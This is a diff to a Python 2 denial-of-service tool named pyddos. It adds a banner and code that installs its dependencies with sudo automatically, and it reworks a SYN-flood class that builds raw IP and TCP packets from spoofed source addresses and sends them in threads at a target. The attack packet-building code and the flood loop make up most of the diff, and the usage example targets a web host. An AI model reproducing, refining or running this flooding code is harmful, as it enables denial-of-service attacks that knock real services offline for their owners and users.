@@ -1,3 +1,20 @@
+#!/usr/bin/env python2
+
+version= '2.0'
+title = '''
+
+      _ \        __ \  __ \               ___|           _)       |   
+     |   | |   | |   | |   |  _ \   __| \___ \   __|  __| | __ \  __|  
+     ___/  |   | |   | |   | (   |\__ \       | (    |    | |   | |   
+    _|    \__, |____/ ____/ \___/ ____/ _____/ \___|_|   _| .__/ \__|  
+           ____/                                            _|         
+                                                                    
+ DDos python script | Script used for testing ddos | Ddos attack     
+ Author: ___T7hM1___                                                
+ Github: http://github.com/t7hm1/pyddos                             
+ Version:'''+version+''' 
+'''
+
 import os
 import sys
 import json
@@ -5,22 +22,40 @@ import time
 import string
 import signal
 import httplib,urlparse
-
-import requests,colorama
-
 from random import *
 from socket import *
 from struct import *
 from threading import *
 from argparse import ArgumentParser,RawTextHelpFormatter
 
-from termcolor import colored,cprint
+if os.name == 'posix':
+	c = os.system('which pip')
+	if c == 256:
+		os.system('sudo apt-get install python-pip')
+	else:
+		pass
+else:
+	print '[-] Check your pip installer'
 
-version= '2.0'
-
+try:
+	import requests,colorama
+	from termcolor import colored,cprint
+except:
+	try:
+		if os.name == 'posix':
+			os.system('sudo pip install colorama termcolor requests')
+			sys.exit('[+] I have installed nessecary modules for you')
+		elif os.name == 'nt':
+			os.sytem('c:\python27\scripts\pip.exe install colorama requests termcolor')
+			sys.exit('[+] I have installed nessecary modules for you')
+		else:
+			sys.exit('[-] Download and install nessecary modules')
+	except Exception,e:
+		print '[-]',e
+if os.name == 'nt':
+	colorama.init()
 
 signal.signal(signal.SIGPIPE,signal.SIG_DFL)
-
 
 def fake_ip():
 	skip = '127'
@@ -229,13 +264,10 @@ class Requester(Thread):
 				pass
 
 class Synflood(Thread):
-	def __init__(self,tgt,ip,port,ttl,window,sock=None):
+	def __init__(self,tgt,ip,sock=None):
 		Thread.__init__(self)
 		self.tgt = tgt
 		self.ip = ip
-		self.port = port
-		self.ttl = ttl
-		self.window = window
 		self.psh = ''
 		if sock is None:
 			self.sock = socket(AF_INET,SOCK_RAW,IPPROTO_TCP)
@@ -254,24 +286,22 @@ class Synflood(Thread):
 
 		return s
 	def Building_packet(self):
-                #facke_port = randint(1,65535)
 		ihl=5
 		version=4
 		tos=0
-		tot=0
-		id=self.port
+		tot=40
+		id=54321
 		frag_off=0
-		ttl = self.ttl
-		#ttl=randint(32,255)
+		ttl=64
 		protocol=IPPROTO_TCP
-		check=0
+		check=10
 		s_addr=inet_aton(self.ip)
 		d_addr=inet_aton(self.tgt)
 
 		ihl_version = (version << 4) + ihl
 		ip_header = pack('!BBHHHBBH4s4s',ihl_version,tos,tot,id,frag_off,ttl,protocol,check,s_addr,d_addr)
 
-		source = self.port
+		source = 54321
 		dest = 80
 		seq = 0
 		ack_seq = 0
@@ -282,8 +312,7 @@ class Synflood(Thread):
 		ack = 0
 		psh = 0
 		urg = 0
-		#window = htons(5840)
-		window = self.window
+		window = htons(5840)
 		check = 0
 		urg_prt = 0
 
@@ -291,21 +320,19 @@ class Synflood(Thread):
 		tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
 		tcp_header=pack('!HHLLBBHHH',source,dest,seq,ack_seq,offset_res,tcp_flags,window,check,urg_prt)
 
-		user_data = 'Attack'
-
 		src_addr = inet_aton(self.ip)
 		dst_addr = inet_aton(self.tgt)
 		place = 0
 		protocol = IPPROTO_TCP
-		tcp_length = len(tcp_header) + len(user_data)
+		tcp_length = len(tcp_header)
 
 		self.psh = pack('!4s4sBBH',src_addr,dst_addr,place,protocol,tcp_length);
-		self.psh = self.psh + tcp_header + user_data;
+		self.psh = self.psh + tcp_header;
 
 		tcp_checksum = self.checksum()
 
 		tcp_header = pack('!HHLLBBHHH',source,dest,seq,ack_seq,offset_res,tcp_flags,window,tcp_checksum,urg_prt)
-		packet = ip_header + tcp_header + user_data
+		packet = ip_header + tcp_header
 
 		return packet
 
@@ -327,7 +354,7 @@ def main():
         version=version,
         formatter_class=RawTextHelpFormatter,
         prog='pyddos',
-        #description=cprint(title,'white',attrs=['bold']),
+        description=cprint(title,'white',attrs=['bold']),
         epilog='''
 Example:
     ./%(prog)s -d www.example.com -p 80 -T 2000 -Pyslow
@@ -367,9 +394,6 @@ Example:
 		threads=[]
 		print colored('[*] Started SYN Flood: ','blue')+colored(tgt,'red')
 		while 1:
-                        ttl=randint(32,255)
-                        fake_port = randint(1,65535)
-                        window = randint(5000,65535)
 			if args.i == False:
 				args.fakeip = True
 				if args.fakeip == True:
@@ -378,7 +402,7 @@ Example:
 				ip = args.i
 			try:
 				for x in xrange(0,int(args.T)):
-					thread=Synflood(tgt,ip,fake_port,ttl,window,sock=synsock)
+					thread=Synflood(tgt,ip,sock=synsock)
 					thread.setDaemon(True)
 					thread.start()
 					thread.join()
